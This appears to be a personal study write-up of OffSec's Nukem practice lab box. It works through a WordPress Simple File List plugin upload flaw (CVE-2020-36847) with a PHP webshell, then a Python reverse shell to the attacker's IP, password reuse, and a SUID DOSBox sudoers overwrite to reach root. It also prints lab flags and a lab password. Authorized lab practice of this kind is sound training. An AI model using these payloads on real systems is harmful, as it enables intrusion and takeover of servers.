---
tags: [oscp, boxes, pg-practice, linux, completed]
platform: PG Practice
os: Linux
hostname: nukem
difficulty: Intermediate
ip: $BoxIP
status: Complete
local_flag: aec3fbe30ec66d42a80a097bfe0775a3
root_flag: b3546b5ae88d781de126ddb1929fb883
---

# PG: Nukem, Full Walkthrough

## The gist

Nukem is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[OSCP/RUNBOOK V2/Linux - File Upload]] used the WordPress plugin upload path to obtain code execution. 2. [[OSCP/RUNBOOK V2/Linux - SUID Check]] found DOSBox running with elevated file privileges. 3. [[OSCP/RUNBOOK V2/Linux - Sudo Check]] confirmed the remaining privileged command path and reached root.

## Box information

| Field | Value |
|---|---|
| Platform | PG Practice |
| OS | Linux (Arch Linux) |
| IP | $BoxIP |
| Difficulty | Intermediate |
| Status | Root |

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon | See section 1 below |
| 2 | Web Enumeration | See section 2 below |
| 3 | Vulnerability Identification | See section 3 below |
| 4 | Foothold | See section 4 below |
| 5 | Post-Exploitation (as http) | See section 5 below |
| 6 | Privilege Escalation | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Nukem`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Nukem
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon

### Port Scan

```bash
sudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP
```

Open ports:

| Port | Service |
|---|---|
| 22/tcp | OpenSSH 8.3 |
| 80/tcp | Apache 2.4.46 -- WordPress |
| 3306/tcp | MariaDB 10.3.24 |
| 5000/tcp | Werkzeug 1.0.1 / Python 3.8.5 |
| 13000/tcp | nginx 1.18.0 "Login V14" |
| 36445/tcp | Samba smbd 4 |


### Service Scan

```bash
sudo nmap -sV -sC -p 22,80,3306,5000,13000,36445 -oN services.nmap $BoxIP
```

Key findings:
- Port 80: WordPress 5.5.1, theme "Retro Gamming". Primary target.
- Port 5000: Werkzeug/Flask app -- no debug console (`/console` → 404), Flask routes `/employees` and `/tracks` return 500.
- Port 13000: nginx custom "Login V14" -- secondary surface, not needed for foothold.
- Port 3306: MariaDB -- externally accessible but not required.

> [!warning] 💡 Hint
> Record secondary services even when they are not used. They may supply version clues, credentials, or a fallback route later, but do not let an interesting banner distract from the service with a clear application fingerprint.


---

## 2. Web Enumeration

### Port 80 -- WordPress "Retro Gamming"

```bash
curl -s http://$BoxIP/ | grep -i "wordpress\|version\|plugin"
```

WordPress install confirmed. Site title: "Retro Gamming". Tutor LMS plugin active (LMS system -- registration/courses pages visible in nav).

### Plugin Version Discovery

```bash
curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/readme.txt" | head -10
```

Output:

```
=== Simple File List ===
Stable tag: 4.2.2
```

Plugin `Simple File List 4.2.2` confirmed active.


### Other Surfaces (Dead Ends)

- `/index.php/dashboard/` -- Tutor LMS course dashboard, requires registration
- `/index.php/sample-page/` -- loads Simple File List assets but no shortcode rendered -- no token visible in source
- Port 5000 `/employees` and `/tracks` -- both 500 (Flask REST API needing unknown parameters)
- Port 13000 -- login form, no default creds worked

---

## 3. Vulnerability Identification

```bash
searchsploit simple file list
```

Key match:

```
Simple File List WordPress Plugin 4.2.2 - File Upload to RCE   |  php/webapps/52371.py
```

```bash
searchsploit -p 52371
cp /usr/share/exploitdb/exploits/php/webapps/52371.py exploits/
```

> [!tip] ⚡ More efficient path
> **What we did:** We resolved and copied the Exploit-DB path as two separate steps.
>
> **Faster approach:**
> ```bash
> searchsploit -m 52371
> ```
> **Why:** The module copies the matching exploit directly into the current directory. This is quicker and avoids path transcription mistakes while keeping the manual review step.


**CVE-2020-36847**: `ee-upload-engine.php` accepts unauthenticated file uploads. Two-step exploit:
1. Upload `.png` file (PHP webshell masquerading as image) → `ee-upload-engine.php`
2. Rename to `.php` via `ee-file-engine.php`

Webshell lands at `/wp-content/uploads/simple-file-list/`.

---

## 4. Foothold

### Step 1 -- Create Webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > exploits/shell.png
```

### Step 2 -- Upload (with required plugin fields)

The upload engine needs plugin-specific POST fields -- not just the `file` field. Without `eeSFL_ID`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token` the endpoint returns HTTP 500.

> [!abstract] 🧠 Why
> Exploit scripts often contain application-specific state that is easy to miss when copying only the payload. Reproduce the complete request, then change one field at a time while using the HTTP status and response body to distinguish missing parameters from a rejected file.

> [!warning] 💡 Hint
> **Watch out:** This upload flaw depends on the plugin's required multipart fields, not only on the filename. Compare every field with the captured request before changing the payload.

The token is a static WordPress option set at plugin install time. Find it from the page that renders the `[simple-file-list]` shortcode, or use the static value from the plugin config.

```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
  -F "file=@exploits/shell.png;type=image/png" \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=1587258885" \
  -F "eeSFL_Token=$Token"
```

Expected output: `SUCCESS`


### Step 3 -- Rename to .php

The rename endpoint uses `eeFileOld` (not `oldFile`/`eeFilename`) and requires `X-Requested-With` + `Referer` headers:

```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://$BoxIP/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" \
  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"
```

Expected output: `SUCCESS`

### Step 4 -- Verify RCE

```bash
curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
```

Output:

```
uid=33(http) gid=33(http) groups=33(http)
```


### Step 5 -- Reverse Shell

**Note**: mkfifo+nc failed here (PHP system() piping issue). Python3 reverse shell worked instead (Python 3.8.5 confirmed via Flask on port 5000).

> [!tip] 🛠️ Alternative tools
> A failed FIFO shell does not invalidate the webshell. Check the target's available interpreters and Netcat variant, then switch to Python, Perl, or a shell command that matches the target environment.

Listener on Kali:

```bash
sudo nc -lvnp 80
```

Trigger:

```bash
curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php" \
  --get --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LocalIP\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

Shell received as `[http@nukem simple-file-list]$`.

Stabilise:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. Post-Exploitation (as http)

### User Flag

```bash
cat /home/commander/local.txt
```

`loot flag user <value>`

### WordPress Config -- Credentials

On Arch Linux, WordPress lives at `/srv/http/` (not `/var/www/html/`):

```bash
cat /srv/http/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD"
```

Output:

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', '<private credential>' );
```

`loot cred commander $Password`

### Lateral Move -- su to commander

DB password works as OS password:

```bash
su - commander
# use the private value stored in $Password
```

Now as `[commander@nukem ~]$`.

---

## 6. Privilege Escalation

### Enumeration

```bash
# SUID check
find / -perm -u=s -type f 2>/dev/null

# Sudo
sudo -l
# Requires password -- dead end for commander before exploit
```

SUID list includes `/usr/bin/dosbox` -- **not a standard GTFOBins binary** but runs as root (SUID). DOSBox is a DOS emulator; its `-c` flag executes DOS commands at startup, including `mount` (maps Linux directories to DOS drives) and `echo` with redirection.

> [!abstract] 🧠 Why
> GTFOBins is a useful index, not a completeness guarantee. An unusual SUID program should be understood as a privileged file-operation primitive: DOSBox can mount `/etc` and write a file there with its effective root permissions.

> [!warning] 💡 Common mistake
> Do not assume a SUID bit automatically gives a shell. Identify what the program can read, write, or execute as root, then choose the smallest controlled file change.


### DOSBox SUID → Sudoers Write

Since DOSBox runs as root (SUID), its DOS `echo` and file redirection write with root privileges:

```bash
dosbox -c 'mount c /etc' -c 'echo commander ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'
```

What this does:
1. `-c 'mount c /etc'` -- mounts Linux `/etc` as DOS C: drive
2. `-c 'echo ... > c:\sudoers'` -- writes to `/etc/sudoers` as root
3. `-c 'exit'` -- closes DOSBox

DOSBox will show ALSA audio errors (no sound card in the box) -- ignore them.

```bash
sudo -n id
# uid=0(root) gid=0(root) groups=0(root)
```


### Root Shell

```bash
sudo -n bash
```

`shot root-shell` (red box: `[root@nukem commander]#`)

### Root Flag

```bash
proof linux
cat /root/proof.txt
```

`loot flag root <value>`

---

## 7. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| WordPress plugin exposes an unauthenticated upload endpoint | Reproduce required fields, upload, then rename | Inspect plugin JavaScript or use Burp to capture the exact request |
| FIFO callback fails through PHP `system()` | Switch to an interpreter confirmed on the target | Keep the webshell for command output and stage a shell script |
| Unusual SUID DOSBox is present | Use its root file-writing capability to repair sudo access | Review the binary manually when it is absent from GTFOBins |

## 8. Vulnerabilities / Techniques

| CVE / Ref | Description | Impact |
|---|---|---|
| CVE-2020-36847 / EDB-52371 | Simple File List 4.2.2 -- unauthenticated file upload + rename → webshell | http shell |
| DOSBox SUID | SUID-root DOSBox mounts /etc, writes to sudoers via DOS echo | root |

---

## 9. Vault Update Checklist

- [x] Screenshots in `$BoxDir/screenshots/` (nmap-allports, nmap-services, wordpress-plugin-version, searchsploit, upload-success, foothold, user-flag, privesc-finding ×2, privesc-exploit, root-shell, PROOF)
- [x] Loot: `flags.txt` (user + root), `creds.txt` (commander credential kept private)
- [ ] Log copied to `OSCP/BOXES/BOX LOGS/Nukem.log`
- [x] Stage notes: WordPress - Simple File List Upload (new), PrivEsc Linux - SUID (+DOSBox), Foothold - Public Exploit (+Nukem)
- [x] Module notes: M08, M13, M18 (+Nukem)
- [x] MASTER BOX LIST updated
- [x] FAQ: plugin upload fields required, rename field names, mkfifo+nc failure, DOSBox SUID technique

## 10. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Linux - File Upload]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - SUID Check]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - Sudo Check]] -- technique used in this walkthrough

## 11. Collect the flags

- `user.txt`: `aec3fbe30ec66d42a80a097bfe0775a3` (value reproduced in the private sections above)
- `root.txt`: `b3546b5ae88d781de126ddb1929fb883` (value reproduced in the private sections above)
- `proof.txt`: `b3546b5ae88d781de126ddb1929fb883` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: aec3fbe30ec66d42a80a097bfe0775a3
root: b3546b5ae88d781de126ddb1929fb883
```

## 12. Clean down
```bash
# Restore /etc/sudoers from pacman package cache
bsdtar -xOf /var/cache/pacman/pkg/sudo-1.9.3.p1-1-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers

# Remove webshell
rm /srv/http/wp-content/uploads/simple-file-list/shell.php

# Remove mkfifo artefacts
rm -f /tmp/f /tmp/nukem* 2>/dev/null
```

Verify sudoers restored (should NOT contain NOPASSWD line):

```bash
grep NOPASSWD /etc/sudoers
```

---

## 13. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Linux - File Upload]] used the WordPress plugin upload path to obtain code execution.
2. [[OSCP/RUNBOOK V2/Linux - SUID Check]] found DOSBox running with elevated file privileges.
3. [[OSCP/RUNBOOK V2/Linux - Sudo Check]] confirmed the remaining privileged command path and reached root.

## Tools used

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| curl | Web recon, upload, rename, RCE |
| searchsploit | EDB-52371 (Simple File List RCE) |
| nc | Reverse shell listener |
| python3 | Reverse shell payload (mkfifo+nc failed) |
| gobuster | Port 5000 route discovery |
| dosbox | SUID privesc -- write to /etc/sudoers |
| bsdtar | Restore /etc/sudoers from pacman package |

---

## Credentials and secrets

| Username | Password | Source |
|---|---|---|
| commander | `$Password` | wp-config.php (DB_PASSWORD) |

---


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Nukem"
export BoxIP="192.168.183.105"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Nukem"
export Domain=""
export DCip=""
export Username="commander"
export Password="CommanderKeenVorticons1990"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
commander:CommanderKeenVorticons1990
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  -c /tmp/wp-cookies.txt \
  -b "wordpress_test_cookie=WP+Cookie+check" \
  -L -o /dev/null -w "%{http_code} %{url_effective}\n"curl"http://$BoxIP/wp-login.php""log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"
  -d "log=admin&pwd=nukem&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
[39m"wordpress_test_cookie=WP+Cookie+check"/dev/null"%{http_code} %{url_effective}\n"[?1l>[?2004l
  -L -o /dev/null -w "%{http_code} %{url_effective}\n"curl"http://$BoxIP/wp-login.php""log=admin&pwd=nukem&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"/tmp/wp-cookies.txt"wordpress_test_cookie=WP+Cookie+check"/dev/null"%{http_code} %{url_effective}\n"[?1l>[?2004l
  -d "log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  -L -o /dev/null -w "%{http_code} %{url_effective}\n"curl"http://$BoxIP/wp-login.php""log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"/tmp/wp-cookies.t
$ [15:43:25] curl -s "http://$BoxIP/" | grep -i "eeSFL\|token\|nonce\|upload"
xt"wordpress_test_cookie=WP+Cookie+check"/dev/null"%{http_code} %{url_effective}\n"[?1l>[?2004l
kali@kali:~/Platforms/Offsec/Nukem [15:39:53] $ [?1h=[?2004hcurl -s "http://$BoxIP/" | grep -i "eeSFL\|token\|nonce\|upload"curl"http://$BoxIP/"grep"eeSFL\|token\|nonce\|upload"[?1l>[?2004l
  -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2"
  -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2"curl"http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php""file=@exploits/shell.png;type=image/png""eeSFL_ID=1""eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/""eeSFL_Timestamp=1587258885""eeSFL_Token=ba288252629a5399759b6fde1e205bc2"[?1l>[?2004l
$ [15:52:08] curl -s "http://$BoxIP/index.php/sample-page/" | grep -i "eeSFL\|token\|nonce\|upload\|simple-file"
kali@kali:~/Platforms/Offsec/Nukem [15:51:45] $ [?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -i "eeSFL\|token\|nonce\|upload\|simple-file"curl"http://$BoxIP/index.php/sample-page/"grep"eeSFL\|token\|nonce\|upload\|simple-file"[?1l>[?2004l
kali@kali:~/Platforms/Offsec/Nukem [15:52:08] $ [?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -A5 "eeSFL\|eeListID\|eeToken"curl"http://$BoxIP/index.php/samp[33
$ [15:52:29] curl -s "http://$BoxIP/index.php/sample-page/" | grep -A5 "eeSFL\|eeListID\|eeToken"
$ [15:53:12] curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -i "token\|nonce\|eeSFL\|listID" | head -20
mle-page/"grep"eeSFL\|eeListID\|eeToken"[?1l>[?2004l
kali@kali:~/Platforms/Offsec/Nukem [15:52:51] $ [?1h=[?2004hcurl -s "http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js" | grep -i "token\|nonce\|eeSFL\|listID" | head -20curl"http://$BoxIP/wp-content/plugins/simple-file-list/js/ee-footer.js"grep"token\|nonce\|eeSFL\|listID"head[?1l>[?2004l
$ [16:04:39] loot flag user aec3fbe30ec66d42a80a097bfe0775a3
$ [16:05:54] boxset Password CommanderKeenVorticons1990
Password:
kali@kali:~/Platforms/Offsec/Nukem [16:04:37] $ [?1h=[?2004hloot flag user aec3fbe30ec66d42a80a097bfe0775a3loot[?1l>[?2004l
[+] Flag saved:  user = aec3fbe30ec66d42a80a097bfe0775a3  →  loot/flags.txt
kali@kali:~/Platforms/Offsec/Nukem [16:05:47] $ [?1h=[?2004hboxset Password CommanderKeenVorticons1990boxset[?1l>[?2004l
[+] Password=CommanderKeenVorticons1990 (saved to .env)
$ [16:15:47] loot flag root b3546b5ae88d781de126ddb1929fb883
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
# Defaults targetpw  # Ask for the password of the target user
kali@kali:~/Platforms/Offsec/Nukem [16:14:08] $ loot flag root b3546b5ae88d781de126ddb1929fb883loot[?1l>[?2004l
[+] Flag saved:  root = b3546b5ae88d781de126ddb1929fb883  →  loot/flags.txt
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Nukem | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

1. **WordPress plugin endpoints need internal fields** -- `ee-upload-engine.php` requires `eeSFL_ID`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token`. Without them it returns HTTP 500 silently. Read the exploit's Python source to understand what fields it sends.

2. **Rename field names differ from the Python exploit** -- The Python script uses `oldFile`/`newFile` but the actual JS code uses `eeFileOld`. Plus the rename requires `X-Requested-With: XMLHttpRequest` and a valid `Referer`. Inspect the plugin JS (`ee-footer.js`) to find the real field names.

3. **mkfifo+nc may fail via PHP system()** -- When PHP's `system()` runs a piped command chain, shell interpretation differences can silently kill it. Try `python3` reverse shell as a reliable fallback.

4. **DB password = OS password** -- Always try `su - $user` with the database password immediately on finding wp-config.php creds.

5. **DOSBox SUID is not GTFOBins-listed** -- DOSBox appears in the SUID list but isn't in the standard GTFOBins patterns. Think about what root-level file access enables: mount any directory as a DOS drive and write files with root. `/etc/sudoers` is the classic target.

6. **Arch Linux layout differences** -- WordPress lives at `/srv/http/` not `/var/www/html/`. Web user is `http` not `www-data`. Python 3 confirmed via port 5000 Flask app -- useful for reverse shell choice.

7. **Confirm file upload with a direct GET before rename** -- `curl -s -o /dev/null -w "%{http_code}"` on the uploaded file. A 200 means the file is there; 404 means the upload silently failed and the rename will too.

---

- Upload vulnerabilities depend on the exact archive layout and application entry point.
- Unusual SUID programs deserve the same careful review as common GTFOBins entries.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern

## External resources

| Resource | Link | Why |
|---|---|---|
| EDB-52371 | https://www.exploit-db.com/exploits/52371 | Simple File List 4.2.2 RCE |
| HackTricks - File Upload | https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/file-upload | File upload bypass and extension tricks |
| PayloadsAllTheThings - Reverse Shells | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md | Python3 and other shell alternatives |
| GTFOBins | https://gtfobins.github.io/#suid | SUID enumeration (DOSBox not listed -- reason to think beyond the list) |
| RevShells | https://www.revshells.com | Python3 reverse shell generator |
| ippsec.rocks | https://ippsec.rocks/?#dosbox | Search for DOSBox privesc technique |

---

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
